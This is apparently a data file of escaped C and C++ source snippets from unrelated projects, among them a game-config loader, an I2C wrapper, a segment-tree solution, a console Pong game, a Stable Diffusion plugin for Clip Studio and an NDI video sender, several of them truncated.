sBaseConfigDir[MAX_PATH];\n\n\tsnprintf((char *)sBaseConfigDir, sizeof(sBaseConfigDir), \"%s\" CORRECT_PATH_SEPARATOR_S \"%s\", pszBaseDir, TICKRATE_GAMECONFIG_FOLDER_DIR);\n\n\treturn m_aStorage.Load(this, sBaseConfigDir, pszPathID, vecMessages);\n}\n\nbool Tickrate::Provider::GameDataStorage::Load(IGameData *pRoot, const char *pszBaseConfigDir, const char *pszPathID, GameData::CBufferStringVector &vecMessages)\n{\n\tconst struct\n\t{\n\t\tconst char *pszFilename;\n\t\tbool (Tickrate::Provider::GameDataStorage::*pfnLoad)(IGameData *, KeyValues3 *, GameData::CBufferStringVector &);\n\t} aConfigs[] =\n\t{\n\t\t{\n\t\t\tTICKRATE_GAMECONFIG_GAMERESOURCE_FILENAME,\n\t\t\t&GameDataStorage::LoadGameResource\n\t\t},\n\t\t{\n\t\t\tTICKRATE_GAMECONFIG_GAMESYSTEM_FILENAME,\n\t\t\t&GameDataStorage::LoadGameSystem\n\t\t},\n\t\t{\n\t\t\tTICKRATE_GAMECONFIG_HOSTFRAME_FILENAME,\n\t\t\t&GameDataStorage::LoadHostFrame\n\t\t},\n\t\t{\n\t\t\tTICKRATE_GAMECONFIG_SOURCE2SERVER_FILENAME,\n\t\t\t&GameDataStorage::LoadSource2Server\n\t\t},\n\t\t{\n\t\t\tTICKRATE_GAMECONFIG_TICK_FILENAME,\n\t\t\t&GameDataStorage::LoadTick\n\t\t}\n\t};\n\n\tchar sConfigFile[MAX_PATH];\n\n\tCUtlString sError;\n\n\tAnyConfig::LoadFromFile_Generic_t aLoadPresets({{&sError, NULL, pszPathID}, g_KV3Format_Generic});\n\n\tfor(const auto &aConfig : aConfigs)\n\t{\n\t\tAnyConfig::Anyone aGameConfig;\n\n\t\tsnprintf((char *)sConfigFile, sizeof(sConfigFile), \"%s\" CORRECT_PATH_SEPARATOR_S \"%s\", pszBaseConfigDir, aConfig.pszFilename);\n\n\t\tCUtlVector<CUtlString> vecConfigFiles;\n\n\t\tg_pFullFileSystem->FindFileAbsoluteList(vecConfigFiles, (const char *)sConfigFile, pszPathID);\n\n\t\tif(vecConfigFiles.Count() < 1)\n\t\t{\n\t\t\tconst char *pszMessageConcat[] = {\"F",
    "/**\n * @file    sysfs_i2c.cpp\n * @author  Mikalai Naurotski (kaljan@nothern.com)\n * @version 0.0.0\n * @date    17-09-24\n *\n * @brief   SYSFS I2C wrapper\n */\n\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n#include <stdint.h>\n#include <fcntl.h>\n#include <errno.h>\n\n#include <sys/ioctl.h>\n#include <linux/i2c-dev.h>\n\n#include \"sysfs_i2c.h\"\n\nnamespace sysfs {\n\nI2C_Wrapper::I2C_Wrapper() {\n}\n\nI2C_Wrapper::~I2C_Wrapper() {\n}\n\nbool I2C_Wrapper::lockBus(uint8_t addr) {\n    m_mutex.lock();\n    if (!m_deviceAddress && addr) {\n        if (ioctl(m_fd, I2C_SLAVE, addr) < 0) {\n            m_mutex.unlock();\n            return false;\n        }\n\n        m_deviceAddress = addr;\n        m_mutex.unlock();\n        return true;\n    } else if (m_deviceAddress == addr) {\n        m_mutex.unlock();\n        return true;\n    }\n    m_mutex.unlock();\n    return false;\n}\n\nbool I2C_Wrapper::unlockBus(uint8_t addr) {\n    m_mutex.lock();\n    if (!m_deviceAddress) {\n        m_mutex.unlock();\n        return true;\n    } else if (m_deviceAddress == addr) {\n        m_deviceAddress = 0;\n        m_mutex.unlock();\n        return true;\n    }\n    m_mutex.unlock();\n    return false;\n}\n\nbool I2C_Wrapper::isOpen() {\n    return (m_fd >= 0);\n}\n\nbool I2C_Wrapper::isLocked(uint8_t addr) {\n    return (m_deviceAddress != addr);\n}\n\nint I2C_Wrapper::openPort(const char* path) {\n\n    int ret = open(path, O_RDWR);\n    if (ret >= 0) {\n        m_portName = path;\n    }\n\n    m_fd = ret;\n\n    return ret;\n}\n\nvoid I2C_Wrapper::closePort() {\n    if (m_fd >= 0) {\n        close(m_fd);\n        m_fd = -1;\n    }\n}\n\nint I2C_Wrapper::writeData(const uint8_t *data, size_t size) {\n    if (!data || !size) {\n        return 0;\n    }\n\n    int ret = 0;\n    m_mutex.lock();\n    ret = write(m_fd, data, size);\n    m_mutex.unlock();\n    return ret;\n}\n\nint I2C_Wrapper::readData(uint8_t *data, size_t size) {\n    if (!data || !size) {\n        return 0;\n    }\n\n    int ret = 0;\n    m_mutex.lock();\n    ret = read(m_fd, data, size);\n    m_mutex.unlock();\n\n    return ret;\n}\n\n}\n",
    "#include \"input.h\"\n#include <iostream>\n#include <cstring>\n\n/**\n * @file\n */\n\nnamespace Prog {\n    /**\n     * @brief Gets an integer in a given range\n     * @param in input stream\n     * @param out output stream\n     * @param min min number allowed to be entered\n     * @param max max number allowed to be entered\n     * @return an entered number\n     * @throws runtime_error when end of file reached \n     * @throws runtime_error when input stream has flag \"bad\"\n     */\n    int get_number(std::istream& in, std::ostream& out, int min, int max) \n    {\n        int n;\n        while (true) {\n            in >> n;\n            if (in.eof()) {\n                throw std::runtime_error(\"EOF\");\n            }\n            else if (in.bad()) {\n                throw std::runtime_error(strerror(errno));\n            }\n            else if (in.fail() || n < min || n > max) {\n                in.clear();\n                in.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\n                out << \"Wrong type of data. Try again: \";\n            }\n            else {\n                return n;\n            }\n        }\n    }\n}\n",
    "#include <bits/stdc++.h>\n#define MID ((l+r)>>1)\n#define LEFT (index<<1)\n#define RIGHT ((index<<1)|1)\n#define MAX_SIZE 1048597\nusing namespace std;\n\nint invalid = -1;\n// range tree supports range update, set [l, r] to val\n// range sum query, query the sum of [l, r]\nstruct segt {\n    int val, lz;\n};\n\nsegt tree[MAX_SIZE];\n\nvoid pushdown(int l, int r, int index) {\n    if (l > r) return;\n    if (l != r && tree[index].lz != invalid) {\n        tree[LEFT].lz = tree[index].lz;\n        tree[RIGHT].lz = tree[index].lz;\n        tree[RIGHT].val = (r - MID) * tree[index].lz;\n        tree[LEFT].val = (MID - l + 1) * tree[index].lz;\n    }\n\n    tree[index].lz = invalid;\n}\n\n// set [start, end] to val\nvoid update(int start, int end, int l, int r, int index, int val) {\n    if (start > end || l > r || start > r || l > end) return;\n    pushdown(l, r, index);\n    if (start <= l && r <= end) {\n        tree[index].val = (r - l + 1) * val;\n        tree[index].lz = val;\n        return;\n    }\n\n    if (end <= MID) {\n        update(start, end, l, MID, LEFT, val);\n    } else if (start >= MID + 1) {\n        update(start, end, MID + 1, r, RIGHT, val);\n    } else {\n        update(start, end, l, MID, LEFT, val);\n        update(start, end, MID + 1, r, RIGHT, val);\n    }\n\n    tree[index].val = tree[LEFT].val + tree[RIGHT].val;\n}\n// range sum of [start, end]\nint query(int start, int end, int l, int r, int index) {\n    if (start > end || l > r || start > r || l > end) return 0;\n    pushdown(l, r, index);\n    if (start <= l && r <= end) return tree[index].val;\n    if (end <= MID) return query(start, end,l, MID, LEFT);\n    else if (start >= MID + 1) return query(start, end, MID + 1, r, RIGHT);\n    return query(start, end,l, MID, LEFT) + query(start, end, MID + 1, r, RIGHT);\n}\n// construct the range tree\nvoid build(int l, int r, int index) {\n    if (l > r) return;\n    tree[index].lz = invalid;\n    if (l == r) return;\n    build(l, MID, LEFT);\n    build(MID + 1, r, RIGHT);\n}\n\nvector<int> g[MAX_SIZE];\nint sz[MAX_SIZE], id[MAX_SIZE], parent[MAX_SIZE], N;\nint cnt = 0;\n\nvoid dfs(int v, int pre) {\n    sz[v] = 1;\n    id[v] = ++cnt;\n    parent[v] = pre;\n    for (auto nv : g[v]) {\n        if (nv != pre) {\n            dfs(nv, v);\n            sz[v] += sz[nv];\n        }\n    }\n}\n\nint main() {\n    int i;\n    scanf(\"%d\", &N);\n    for (i = 1; i < N; ++i) {\n        int u, v;\n        scanf(\"%d%d\", &u, &v);\n        g[u].push_back(v);\n        g[v].push_back(u);\n    }\n\n\n    dfs(1, 0);\n    build(1, N, 1);\n\n    int Q;\n    scanf(\"%d\", &Q);\n    while (Q-- > 0) {\n        int tp, v;\n        scanf(\"%d%d\", &tp, &v);\n        if (tp == 1) {\n            // fill node v with water\n            int full = query(id[v], id[v] + sz[v] - 1, 1, N, 1) == sz[v];\n\n            update(id[v], id[v] + sz[v] - 1, 1, N, 1, 1);\n            if (!full) {\n                update(id[parent[v]], id[parent[v]], 1, N ,1, 0);\n            }\n        } else if (tp == 2) {\n            // empty node v\n            update(id[v], id[v], 1, N, 1, 0);\n        } else {\n            // query if node v has water\n            printf(\"%d\\n\", query(id[v], id[v] + sz[v] - 1, 1, N, 1) == sz[v]);\n        }\n\n    }\n    return 0;\n}",
    "#include \"raylib.h\"\n#include <iostream>\n#include <vector>\n#include <string>\n\n#include \"Config.hpp\"\n#include \"Light.hpp\"\n#include \"Block.hpp\"\n\nint main(int argc, char *argv[])\n{\n\n    int width = 800;\n    int height = 450;\n\n    SetTraceLogLevel(LOG_WARNING);\n    SetConfigFlags(FLAG_MSAA_4X_HINT);\n    InitWindow(width, height, \"GravitX\");\n\n    SetWindowState(FLAG_WINDOW_RESIZABLE);\n    SetWindowState(FLAG_WINDOW_MAXIMIZED);\n    SetTargetFPS(60);\n\n    width = GetRenderWidth();\n    height = GetRenderHeight();\n    LightRay::ray_cnt = 0;\n\n    Light light = Light(Vector2{100, height / 2.0f}, RED, 5);\n    Block block = Block(Vector2{1500, 750}, Vector2{750, 250}, PI / 4, 1.3);\n    Block block2 = Block(Vector2{1000, 600}, Vector2{3000, 250}, 0, 1.3);\n\n    while (!WindowShouldClose())\n    {\n        printf(\"new iter\\n\");\n        if (IsWindowResized())\n        {\n            width = GetRenderWidth();\n            height = GetRenderHeight();\n        }\n\n        if (GetMouseWheelMove() != 0)\n        {\n            light.ray_cnt *= 1 + GetMouseWheelMove() / 2;\n            light.ray_cnt = std::max((int)light.ray_cnt, 1);\n        }\n\n        BeginDrawing();\n        ClearBackground(BLACK);\n\n        DrawText((std::to_string(GetFPS()) + \" FPS\" + \"\\n\" + std::to_string(LightRay::ray_cnt) + \" rays\").c_str(), 0, 0, 20, WHITE);\n\n        for (Block *b : Block::blocks)\n        {\n            b->clearRays();\n        }\n        \n        light.position = GetMousePosition();\n\n        light.update();\n        light.draw();\n\n        if (IsKeyDown(KEY_LEFT))\n            block.tilt += 0.02f;\n        else if (IsKeyDown(KEY_RIGHT))\n            block.tilt -= 0.02f;\n        \n        block.compute_dioptres();\n        block.draw();\n        block2.draw();\n\n        EndDrawing();\n    }\n\n    CloseWindow();\n    return 0;\n}",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <time.h>\r\n#include <windows.h>\r\n\r\nint topx = 40, topy = 12, e_topx, e_topy, ox = 79, oy = 12, blgx = 2, blgy = 12, ran, a, b, i, top_random, blg_puan, o_puan, top_basla;\r\nchar tus, top = 184, cizgi = 219;\r\nint lastUpdateTime = 0; // Last time the ball was updated\r\nint updateInterval = 50; // Interval in milliseconds\r\n\r\n// Clear the screen\r\nvoid clrscr() {\r\n    system(\"cls\");\r\n}\r\n\r\nvoid setConsoleSize(int width, int height) {\r\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\r\n    SMALL_RECT windowSize = {0, 0, width - 1, height - 1};\r\n    COORD bufferSize = {width, height};\r\n\r\n    // Set the buffer size\r\n    SetConsoleScreenBufferSize(hConsole, bufferSize);\r\n\r\n    // Set the window size\r\n    SetConsoleWindowInfo(hConsole, TRUE, &windowSize);\r\n}\r\n\r\nint direction; // Global variable to store the ball's movement direction\r\n\r\nint basla() {\r\n    topx = 40;\r\n    topy = 12;\r\n    top_basla = rand() % 4; // Randomize the starting direction\r\n\r\n    // Set the initial direction (0: sag_asagi, 1: sol_asagi, 2: sag_yukari, 3: sol_yukari)\r\n    direction = top_basla;\r\n    return 0;\r\n}\r\n\r\n// Move the cursor\r\nvoid gotoxy(int x, int y) {\r\n    COORD coord = {x - 1, y - 1};  // Windows uses 0-based, gotoxy() in old C is 1-based.\r\n    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);\r\n}\r\n\r\n// Set text color\r\nvoid textcolor(int color) {\r\n    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);\r\n}\r\n\r\nint acilis() {\r\n    clrscr();\r\n    gotoxy(26, 8); textcolor(4); printf(\"PPPPP  OOOO  NN    N  GGGGG\");\r\n    gotoxy(26, 9); textcolor(4); printf(\"P   P  O  O  N N   N  G    \");\r\n    gotoxy(26, 10); textcolor(4); printf(\"PPPPP  O  O  N  N  N  G GGG\");\r\n    gotoxy(26, 11); textcolor(4); printf(\"P      O  O  N   N N  G   G\");\r\n    gotoxy(26, 12); textcolor(4); printf(\"P      OOOO  N    NN  GGGGG\");\r\n    gotoxy(26, 14); textcolor(3); printf(\"---------------------------\");\r\n    gotoxy(27, 15); textcolor(13); printf(\"Game by KARTOPU AND G\u2122KSU\");\r\n    gotoxy(26, 16); textcolor(3); printf(\"---------------------------\");\r\n    gotoxy(27, 18); textcolor(14); printf(\"PRESS ANY KEY TO CONTINUE\");\r\n    gotoxy(80, 25); getchar(); clrscr();\r\n    return 0;\r\n}\r\n\r\nint top_ciz() {\r\n    gotoxy(topx, topy); textcolor(3); printf(\"%c\", top);\r\n    return 0;\r\n}\r\n\r\nint top_sil() {\r\n    gotoxy(topx, topy); textcolor(3); printf(\" \");\r\n    return 0;\r\n}\r\n\r\nint oyuncu_ciz() {\r\n    gotoxy(ox, oy - 1); textcolor(5); printf(\"%c\", cizgi);\r\n    gotoxy(ox, oy); textcolor(5); printf(\"%c\", cizgi);\r\n    gotoxy(ox, oy + 1); textcolor(5); printf(\"%c\", cizgi);\r\n    return 0;\r\n}\r\n\r\nint oyuncu_sil() {\r\n    gotoxy(ox, oy - 1); textcolor(5); printf(\" \");\r\n    gotoxy(ox, oy); textcolor(5); printf(\" \");\r\n    gotoxy(ox, oy + 1); textcolor(5); printf(\" \");\r\n    return 0;\r\n}\r\n\r\nint bilgisayar_oyna() {\r\n    // Check if the ball is moving towards the computer paddle\r\n    if (topx <= blgx + 1) {\r\n        // Basic AI: Follow the ball's vertical position with a reaction time\r\n        if (topy < blgy) {\r\n            blgy--;  // Move up\r\n        } else if (topy > blgy + 1) {\r\n            blgy++;  // Move down\r\n        }\r\n\r\n        // Add reaction delay to avoid perfect accuracy\r\n        if (rand() % 100 < 5) {\r\n            // Randomly introduce slight delays in movement\r\n            if (topy < blgy) {\r\n                blgy--;  // Move up\r\n            } else if (topy > blgy + 1) {\r\n                blgy++;  // Move down\r\n            }\r\n        }\r\n\r\n        // Ensure the paddle stays within bounds\r\n        if (blgy < 2) blgy = 2;\r\n        if (blgy > 22) blgy = 22;\r\n    }\r\n    return 0;\r\n}\r\n\r\n\r\nint oyuncu_oyna() {\r\n    // Adjust the paddle movement speed\r\n    int speed = 2; // Increase this value to make the paddle move faster\r\n\r\n    if (tus == 'w') { oy -= speed; }  // Move up\r\n    if (tus == 's') { oy += speed; }  // Move down\r\n\r\n    // Ensure the paddle stays within bounds\r\n    if (oy < 2) { oy = 2; }\r\n    if (oy > 24) { oy = 24; }\r\n\r\n    return 0;\r\n}\r\n\r\nint bilgisayar_ciz() {\r\n    gotoxy(blgx, blgy - 1); textcolor(12); printf(\"%c\", cizgi);\r\n    gotoxy(blgx, blgy); textcolor(12); printf(\"%c\", cizgi);\r\n    gotoxy(blgx, blgy + 1); textcolor(12); printf(\"%c\", cizgi);\r\n    return 0;\r\n}\r\n\r\nint bilgisayar_sil() {\r\n    gotoxy(blgx, blgy - 1); textcolor(12); printf(\" \");\r\n    gotoxy(blgx, blgy); textcolor(12); printf(\" \");\r\n    gotoxy(blgx, blgy + 1); textcolor(12); printf(\" \");\r\n    return 0;\r\n}\r\n\r\n// Function to move the ball down and right\r\nvoid sag_asagi() {\r\n    topx++; // Move right\r\n    topy++; // Move down\r\n}\r\n\r\n// Function to move the ball down and left\r\nvoid sol_asagi() {\r\n    topx--; // Move left\r\n    topy++; // Move down\r\n}\r\n\r\n// Function to move the ball up and right\r\nvoid sag_yukari() {\r\n    topx++; // Move right\r\n    topy--; // Move up\r\n}\r\n\r\n// Function to move the ball up and left\r\nvoid sol_yukari() {\r\n    topx--; // Move left\r\n    topy--; // Move up\r\n}\r\n\r\n// Define your ball movement logic here (functions",
    "/**\n * @file SDPlugin.cpp\n * @author \u9752\u732b (AonekoSS)\n * @brief \u30af\u30ea\u30b9\u30bf\u7528\u306e\u753b\u50cf\u751f\u6210\u30d7\u30e9\u30b0\u30a4\u30f3\uff1a\u30e1\u30a4\u30f3\u30e2\u30b8\u30e5\u30fc\u30eb\n */\n#include \"pch.h\"\n#include <filesystem>\n\n#include \"SDPlugin.h\"\n#include \"FilterPlugIn.h\"\n#include \"StableDiffusion.h\"\n\nusing namespace FilterPlugIn;\nusing namespace StableDiffusion;\n\n/// \u3053\u306e\u30d7\u30e9\u30b0\u30a4\u30f3\u306e\u30e2\u30b8\u30e5\u30fc\u30ebID\uff08GUID\uff09\n/// @note \u30d7\u30e9\u30b0\u30a4\u30f3\u6bce\u306b\u9055\u3046\u5024\u306b\u3057\u306a\u3044\u3068\u99c4\u76ee\nconstexpr auto kModuleIDString = \"13E3F872-F4BD-4EFD-8F60-6B20BA7BB1B8\";\n\n/// \u3053\u306eDLL\u306e\u30d9\u30fc\u30b9\u30d1\u30b9\nstd::string g_BasePath;\n\n/// \u30c7\u30d0\u30c3\u30b0\u30ed\u30b0\u306e\u66f8\u304d\u51fa\u3057\u5148\nstd::string g_DebugPath;\n\n/// \u30c7\u30d0\u30c3\u30b0\u51fa\u529b\u306e\u958b\u59cb\nvoid InitDebugOutput(const std::string& basePath) {\n\tg_DebugPath = basePath + \"debuglog.txt\";\n\tFILE* fp = nullptr;\n\tfopen_s(&fp, g_DebugPath.c_str(), \"w\");\n\tif (fp) fclose(fp);\n}\n\n/// \u30c7\u30d0\u30c3\u30b0\u51fa\u529b\n/// @note \u30db\u30b9\u30c8\u30a2\u30d7\u30ea\u304c\u30c7\u30d0\u30c3\u30ac\u3092\u5acc\u3046\u304b\u3089\u539f\u59cb\u7684\u306a\u30d5\u30a1\u30a4\u30eb\u51fa\u529b\u3067\nvoid print(const char* format, ...) {\n\tif (g_DebugPath.empty()) return;\n\tFILE* fp = nullptr;\n\tfopen_s(&fp, g_DebugPath.c_str(), \"a\");\n\tif (fp) {\n\t\tva_list arg;\n\t\tva_start(arg, format);\n\t\tvfprintf(fp, format, arg);\n\t\tva_end(arg);\n\t\tfputs(\"\\n\", fp);\n\t\tfclose(fp);\n\t}\n}\n\n/// @brief \u30d9\u30fc\u30b9\u30d1\u30b9\u53d6\u5f97\n/// @param hModule \u30e2\u30b8\u30e5\u30fc\u30eb\u30cf\u30f3\u30c9\u30eb\n/// @return \u3053\u306e\u30e2\u30b8\u30e5\u30fc\u30eb\u306e\u30d9\u30fc\u30b9\u30d1\u30b9\n/// @note \u30ed\u30f3\u30b0\u30d1\u30b9\u5bfe\u7b56\u306a\u3057\u306e\u7c21\u6613\u7248\u3060\u3051\u3069\u7528\u9014\u7684\u306b\u306f\u5927\u4e08\u592b\u306a\u7b48\nstd::string GetBasePath(HMODULE hModule) {\n\tstd::vector<char> buf(MAX_PATH);\n\tGetModuleFileNameA(hModule, &buf[0], MAX_PATH);\n\tstd::filesystem::path path(&buf[0]);\n\treturn path.parent_path().string() + \"\\\\\";\n}\n\n/// @brief DLL\u306e\u30a8\u30f3\u30c8\u30ea\u30fc\u30dd\u30a4\u30f3\u30c8\n/// @param hModule DLL\uff08\u81ea\u5206\uff09\u306e\u30e2\u30b8\u30e5\u30fc\u30eb\u30cf\u30f3\u30c9\u30eb\n/// @param fdwReason \u547c\u3070\u308c\u305f\u7406\u7531\uff08\u30d7\u30ed\u30bb\u30b9or\u30b9\u30ec\u30c3\u30c9\u306e\u30a2\u30bf\u30c3\u30c1or\u30c7\u30bf\u30c3\u30c1\uff09\n/// @param lpReserved \u4e88\u7d04\u6e08\u307f\n/// @return \u57fa\u672c\u7684\u306bTRUE\uff08\u30ed\u30fc\u30c9\u76f8\u624b\u306bNULL\u8fd4\u3059\u306a\u3089FALSE\uff09\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD  fdwReason, LPVOID lpReserved) {\n\tswitch (fdwReason) {\n\tcase DLL_PROCESS_ATTACH:\n\t\t// \u30d9\u30fc\u30b9\u30d1\u30b9\u306e\u53d6\u5f97\uff06\u30c7\u30d0\u30c3\u30b0\u51fa\u529b\u306e\u958b\u59cb\n\t\tg_BasePath = GetBasePath(hModule);\n\t\tInitDebugOutput(g_BasePath);\n\t\tbreak;\n\tcase DLL_THREAD_ATTACH:\n\tcase DLL_THREAD_DETACH:\n\tcase DLL_PROCESS_DETACH:\n\t\tbreak;\n\t}\n\treturn TRUE;\n}\n\n/// \u30d5\u30a3\u30eb\u30bf\u30fc\u60c5\u5831\nstruct FilterInfo {\n\tServer const* server;\n\tStableDiffusion::Params params;\n};\n\n/// \u30d7\u30ed\u30d1\u30c6\u30a3\u30ad\u30fc\nenum PropertyKey {\n\tITEM_FUNCTION = 1,\n\tITEM_STEPS,\n\tITEM_STRENGTH,\n\tITEM_CONTROL_STRENGTH,\n\tITEM_PROMPT,\n\tITEM_NPROMPT,\n};\n\n/// \u30d7\u30e9\u30b0\u30a4\u30f3\u521d\u671f\u5316\n/// @return \u6b63\u5e38\u7d42\u4e86\u306a\u3089true\n/// @note \u3053\u3053\u3067false\u8fd4\u3059\u3068\u30af\u30ea\u30b9\u30bf\u306e\u30d0\u30fc\u30b8\u30e7\u30f3\u4e0a\u3052\u308d\u3063\u3066\u8a00\u308f\u308c\u308b\nstatic bool InitializeModule(FilterPlugIn::Server* server, FilterPlugIn::Ptr* data) {\n\t// \u521d\u671f\u5316\n\tFilterPlugIn::ModuleInitialize initialize(server);\n\tif (!initialize.Initialize(kModuleIDString)) return false;\n\n\t// \u60c5\u5831\u30a4\u30f3\u30b9\u30bf\u30f3\u30b9\n\tauto info = new FilterInfo;\n\tinfo->server = server;\n\t*data = info;\n\n\treturn true;\n}\n\n/// \u30d7\u30e9\u30b0\u30a4\u30f3\u7d42\u4e86\n/// @return \u6b63\u5e38\u7d42\u4e86\u306a\u3089true\nstatic bool TerminateModule(FilterPlugIn::Server* server, FilterPlugIn::Ptr* data) {\n\t// \u60c5\u5831\u30a4\u30f3\u30b9\u30bf\u30f3\u30b9\u89e3\u653e\n\tif (*data) {\n\t\tdelete static_cast<FilterInfo*>(*data);\n\t\t*data = nullptr;\n\t}\n\t// StableDiffusion\u306eDLL\u89e3\u653e\n\tStableDiffusion::Terminate();\n\treturn true;\n}\n\n\n/// \u30d7\u30ed\u30d1\u30c6\u30a3\u306e\u521d\u671f\u5316\nstatic void InitProperty(Property& p) {\n\tauto type = p.addEnumerationItem(ITEM_FUNCTION, \"Function Type\");\n\ttype.addValue((int)Mode::TXT2IMG, \"TXT2IMG\");\n\ttype.addValue((int)Mode::IMG2IMG, \"IMG2IMG\");\n\ttype.addValue((int)Mode::CONTROL, \"CONTROL\");\n\n\tp.addIntegerItem(ITEM_STEPS, \"Steps\", 20, 1, 60);\n\tp.addDecimalItem(ITEM_STRENGTH, \"Stremgth\", 0.5, 0.0, 1.0);\n\tp.addDecimalItem(ITEM_CONTROL_STRENGTH, \"Control Stremgth\", 8.0, 1.0, 20.0);\n\n\tp.addStringItem(ITEM_PROMPT, \"Prompt\", 800);\n\tp.addStringItem(ITEM_NPROMPT, \"Negative Prompt\", 800);\n}\n\n/// @brief \u30e2\u30fc\u30c9\u306e\u5207\u308a\u66ff\u3048\n/// @param mode \u30b9\u30a4\u30c3\u30c1\u5148\u306e\u30e2\u30fc\u30c9\n/// @param data \u30d5\u30a3\u30eb\u30bf\u30fc\u60c5\u5831\n/// @param propertyObject \u53cd\u6620\u5148\u30d7\u30ed\u30d1\u30c6\u30a3\nstatic void SwitchToMode(StableDiffusion::Mode mode, StableDiffusion::Params& params, Property& property) {\n\t// \u30b3\u30f3\u30d5\u30a3\u30b0\u306e\u30ed\u30fc\u30c9\n\tauto iniPath = g_BasePath + \"SDPlugin.ini\";\n\tprint(\"load: %s\", iniPath.c_str());\n\tauto config = LoadParams(iniPath, \"COMMON\");\n\tswitch (mode) {\n\tcase Mode::TXT2IMG: config = LoadParams(iniPath, \"TXT2IMG\", config); break;\n\tcase Mode::IMG2IMG: config = LoadParams(iniPath, \"IMG2IMG\", config); break;\n\tcase Mode::CONTROL: config = LoadParams(iniPath, \"CONTROL\", config); break;\n\t}\n\tconfig.mode = mode;\n\tparams = config;\n\n\t// \u30d7\u30ed\u30d1\u30c6\u30a3\u3078\u306e\u53cd\u6620\n\tproperty.setInteger(ITEM_STEPS, config.sample_steps);\n\tproperty.setDecimal(ITEM_STRENGTH, config.strength);\n\tproperty.setDecimal(ITEM_CONTROL_STRENGTH, config.control_strength);\n\tproperty.setStringDefault(ITEM_PROMPT, config.prompt);\n\tproperty.setStringDefault(ITEM_NPROMPT, config.negative_prompt);\n\n}\n\n/// \u30d7\u30ed\u30d1\u30c6\u30a3\u540c\u671f\nstatic bool SyncProperty(Int itemKey, PropertyObject propertyObject, Ptr data) {\n\tauto& info = *static_cast<FilterInfo*>(data);\n\tauto& params = info.params;\n\tProperty property(info.server, propertyObject);\n\n\tswitch (itemKey) {\n\tcase ITEM_FUNCTION:\n\t{\n\t\t// \u30e2\u30fc\u30c9\u5909\u66f4\u3092\u691c\u51fa\u3057\u3066\u30b3\u30f3\u30d5\u30a3\u30b0\u3092\u5207\u308a\u66ff\u3048\u308b\n\t\tauto mode = Mode(property.getEnumeration(ITEM_FUNCTION));\n\t\tif (params.mode != mode) {\n\t\t\tSwitchToMode(mode, params, property);\n\t\t\treturn true;\n\t\t}\n\t}\n\tbreak;\n\tcase ITEM_STEPS:\n\t\treturn property.sync(ITEM_STEPS, params.sample_steps);\n\tcase ITEM_STRENGTH:\n\t\treturn property.sync(ITEM_STRENGTH, params.strength);\n\tcase ITEM_CONTROL_STRENGTH:\n\t\treturn property.sync(ITEM_CONTROL_STRENGTH, params.control_strength);\n\tcase ITEM_PROMPT:\n\t\treturn property.sync",
    "#include <iostream>\n\nusing namespace std;\n\nclass Time {\n    private:\n        int hour;\n        int minute;\n        int second;\n    public:\n        Time(int hour, int minute, int second) {\n            this->hour = hour;\n            this->minute = minute;\n            this->second = second;\n        }\n        void setTime(int hour, int minute, int second) {\n            this->hour = hour;\n            this->minute = minute;\n            this->second = second;\n        }\n        void setHour(int hour) {\n            this->hour = hour;\n        }\n        void setMinute(int minute) {\n            this->minute = minute;\n        }\n        void setSecond(int second) {\n            this->second = second;\n        }\n        int getHour() {\n            return hour;\n        }\n        int getMinute() {\n            return minute;\n        }\n        int getSecond() {\n            return second;\n        }\n        void nextSecond() {\n            this->second++;\n            if (this->second == 60)\n            {\n                this->second = 0;\n                this-> minute++;\n                if (this->minute == 60)\n                {\n                    this->minute = 0;\n                    this->hour++;\n                }\n            }\n        }\n        void previousSecond() {\n            this->second--;\n            if(this->second == -1)\n            {\n                this->second = 59;\n                this->minute--;\n                if (this->minute == -1)\n                {\n                    this->minute = 59;\n                    this->hour--;\n                }\n            }\n        }\n        void display() {\n            if (hour < 10) {\n                cout << \"0\" << hour << \":\";\n            } else {\n                cout << hour << \":\";\n            }\n            if (minute < 10) {\n                cout << \"0\" << minute << \":\";\n            } else {\n                cout << minute << \":\";\n            }\n            if (second < 10) {\n                cout << \"0\" << second << endl;\n            } else {\n                cout << second << endl;\n            }\n        }\n};",
    "#include <csignal>\n#include <atomic>\n#include <iostream>\n#include <string>\n#include <Processing.NDI.Lib.h>\n#include <opencv2/opencv.hpp>\n\nstd::atomic<bool> keep_running(true);\n\nvoid signal_handler(int signal) {\n    if (signal == SIGINT) {\n        keep_running = false;\n    }\n}\n\nint main(int argc, char* argv[]) {\n    if (argc < 2 || argc > 3) {\n        std::cerr << \"Usage: \" << argv[0] << \" <path_to_mp4_file> [ndi_name]\" << std::endl;\n        return 1;\n    }\n\n    const char* ndi_name = (argc == 3) ? argv[2] : \"NDI Video Sender\";\n\n    // Initialize NDI\n    if (!NDIlib_initialize()) {\n        std::cerr << \"Failed to initialize NDI.\" << std::endl;\n        std::cerr << \"You will need to download and install NDI\u00ae Tools to use this player.\" << std::endl;\n        std::cerr << \"NDI\u00ae is a registered trademark of Vizrt NDI AB https://ndi.video/\" << std::endl;\n        return 1;\n    }\n\n    // Create an NDI source\n    NDIlib_send_create_t NDI_send_create_desc;\n    NDI_send_create_desc.p_ndi_name = ndi_name;\n\n    NDIlib_send_instance_t pNDI_send = NDIlib_send_create(&NDI_send_create_desc);\n    if (!pNDI_send) {\n        std::cerr << \"Failed to create NDI sender.\" << std::endl;\n        return 1;\n    }\n\n    // Open the video file\n    cv::VideoCapture cap(argv[1]);\n    if (!cap.isOpened()) {\n        std::cerr << \"Error opening video file\" << std::endl;\n        return 1;\n    }\n\n    // Get video properties\n    int width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));\n    int height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));\n    double fps = cap.get(cv::CAP_PROP_FPS);\n\n    // Create NDI video frame\n    NDIlib_video_frame_v2_t NDI_video_frame;\n    NDI_video_frame.xres = width;\n    NDI_video_frame.yres = height;\n    NDI_video_frame.FourCC = NDIlib_FourCC_type_BGRA;\n    NDI_video_frame.frame_rate_N = static_cast<int>(fps * 100);\n    NDI_video_frame.frame_rate_D = 100;\n\n\n    // Register the signal handler\n    std::signal(SIGINT, signal_handler);\n\n    std::cerr << \"Playing \" << argv[1] << \" on NDI output: \" << ndi_name << 